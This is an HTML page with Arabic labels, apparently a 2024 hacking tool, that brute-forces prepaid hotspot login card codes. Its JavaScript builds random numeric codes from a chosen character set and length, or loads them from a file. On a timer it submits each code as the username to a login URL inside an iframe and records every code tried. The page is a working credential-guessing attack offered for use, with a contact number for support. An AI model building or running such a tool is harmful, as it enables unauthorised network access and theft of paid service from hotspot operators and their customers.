<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Zulflqar</title>
</head>

<style>
    body {
        background-color: #000; /* خلفية سوداء */
        color: #0f0; /* نص أخضر نيون */
    }

    #loginPageViewer {
        width: 100%;
        height: 60px;
        margin-bottom: 30px;
        height: 800px;
        background-color: #111; /* خلفية داكنة */
        color: #0f0; /* نص أخضر نيون */
    }

    .toolsbox input {
        width: 300px;
        background: #111; /* خلفية داكنة */
        display: block;
        text-align: center;
        font-weight: bold;
        height: auto;
        margin: auto;
        box-shadow: 0 5px 35px rgb(0 255 0 / 50%); /* ظل أخضر */
        border-radius: 10px;
        outline: 0;
        border: 0;
        border-bottom: 1px solid rgba(0, 255, 0, .25); /* حد أخضر */
        padding: 9px 16px 8px 16px;
        color: #0f0; /* نص أخضر نيون */
    }

    .input, button, select, textarea {
        font: inherit;
        font-size: 100%;
        color: #0f0; /* نص أخضر نيون */
        line-height: normal;
    }

    .widget input[type=text], .widget input[type=email], .widget textarea {
        display: block;
        width: 100%;
        background: #111; /* خلفية داكنة */
        box-shadow: 0 5px 35px rgb(0 255 0 / 50%); /* ظل أخضر */
        border-radius: 10px;
        outline: 0;
        border: 0;
        border-bottom: 1px solid rgba(0, 255, 0, .25); /* حد أخضر */
        padding: 25px 16px 8px 16px;
        line-height: 1.6em;
        transition: var(--trans-1);
        color: #0f0; /* نص أخضر نيون */
    }

    #dlink {
        text-decoration: none;
        color: #0f0; /* نص أخضر نيون */
        background-color: #222; /* خلفية داكنة */
        padding: 5px 10px;
        visibility: hidden;
        font-weight: bold;
        box-shadow: 0 5px 35px rgb(0 255 0 / 50%); /* ظل أخضر */
    }

    .toolsbox button {
        min-width: 100px;
        background: #111; /* خلفية داكنة */
        display: block;
        text-align: center;
        font-weight: bold;
        height: auto;
        box-shadow: 0 5px 35px rgb(0 255 0 / 50%); /* ظل أخضر */
        border-radius: 10px;
        border: 0;
        padding: 13px 17px 8px 14px;
        color: #0f0; /* نص أخضر نيون */
        list-style: none;
        margin: 10px;
        position: relative;
        width: calc(100% + 30px);
        left: -15px;
        right: -15px;
        font-size: 13px;
    }

    .toolsbox button:hover {
        background-color: #222; /* خلفية داكنة */
        box-shadow: 0 5px 35px rgb(0 255 0 / 50%); /* ظل أخضر */
    }

    #currentUsername {
        background-color: #222; /* خلفية داكنة */
        color: #0f0; /* نص أخضر نيون */
    }

    .progress {
        appearance: auto;
        box-sizing: border-box;
        display: inline-block;
        block-size: 1em;
        inline-size: 10em;
        vertical-align: -0.2em;
        writing-mode: horizontal-tb !important;
        color: #0f0; /* نص أخضر نيون */
    }

    .toolsbox {
        text-align: center;
        font-weight: bold;
        color: #0f0; /* نص أخضر نيون */
        box-shadow: 0 5px 35px rgb(0 255 0 / 50%); /* ظل أخضر */
    }
</style>

<body id="body">
<center><img src=https://www.raed.net/im?id=965235.jpeg"></center>  

<CENTER>
<br>
<br>
<marquee scrolldelay="200" 
border-radius="10px" width="300px" height="30px" direction="right"bgcolor="var(--contentB)"><font color="#0f0">2024 تطوير ذولــفــقــارالــواقــدي</font></marquee>
<br>
<br>
</CENTER>

<div class="toolsbox">
<a href="https://www.raed.net/img?id=963594" id="dlink">حفظ في الملفات</a><br><br>
            	
رابط صفحة تسجيل الدخول<input type="text" id="loginURL" value="http://ibbphone/login" /><br>
الرموز المكونة للكرت<input type="text" id="loginChars" value="0123456789" /><br>
عدد الرموز المكونة للكرت<input id="loginUsernameLength" value="9" /><br>
جزء بداية الكرت إذا كان ثابت<input type="text" id="loginUsernameFixed" value="" /><br>
عدد الكروت المطلوب تخمينها ومن ثم توقف<input id="loginCount" value="100" /><br>
msالزمن بين المحاولة والمحاولة<input id="loginTimeOut" value="2000" /><br>
<br>
<br>
<br>
<button onclick="usingFile()">إستخدم الكروت من ملف</button>
<button onclick="runProgram()">إبدأ</button>
<button onclick="stopProgram()">توقف</button>
<button onclick="saveFile()">حفظ الكروت التي تم تجريبها</button><br><br>
<progress id="prog" width="300" max="100"></progress><br>
<input id="currentUsername"><br>
<iframe src="" id="loginPageViewer"></iframe>
</div>

<script>
    var fileData=[1,2,3,4];
    var isUsingFile=false;
    var dataUsed=new Array();
    var ref;
    var counter=0;
function getRandom(){
    pwdLen=(loginUsernameLength.value)-loginUsernameFixed.value.length;
    chars=loginChars.value.toString();
    result=loginUsernameFixed.value.toString();
    for(x=0;x<pwdLen;x++){
        result +=""+chars.charAt(Math.floor(Math.random()*chars.length));
    }
    lastPwd=result;
    return result;
} 
function usingFile(){
filename=prompt("input file path","");
isUsingFile=true;
sc=document.createElement("script");
sc.src=filename;
body.appendChild(sc);
}
function saveFile(){
    filename=prompt("input file name to save","");
    myjson=JSON.stringify(dataUsed);
    text=encodeURIComponent("fileData="+myjson+";");
    dlink.href="data:text/plain;charset=utf-8,"+text;
    dlink.download=filename;
    dlink.style.visibility="visible";
}
function stopProgram(){
clearInterval(ref);
}
function runProgram(){
    counter=0;
if(isUsingFile){
    ref=setInterval(loginFromFile,parseInt(loginTimeOut.value));
}
else{
    ref=setInterval(loginFromScript,parseInt(loginTimeOut.value));
}
}
function loginFromFile(){
if (counter<fileData.length){
    cpwd=fileData[counter++];
    loginPageViewer.src=loginURL.value+"?username="+cpwd;
    currentUsername.value=cpwd;
}else{
    stopProgram();
}
}
function loginFromScript(){
    if (counter<parseInt(loginCount.value)){
    cpwd=getRandom();
    loginPageViewer.src=loginURL.value+"?username="+cpwd;
    currentUsername.value=cpwd;
    dataUsed[dataUsed.length++]=cpwd;
    prog.value=Math.floor((counter/loginCount.value)*100);
    counter++;
}else{
    stopProgram();
}
}
</script>

<CENTER>
<br>
<br>
<marquee scrolldelay="200" 
-radius="10px" width="300px" height="30px" direction="right"bgcolor="var(--contentB)"><font color="#0f0">لتواصل والاستفسار حول التطبيق يرجاء التواصل على هذا الرقم +967733548732</font></marquee>
<br>
<br>
</CENTER>

</body>
</html>
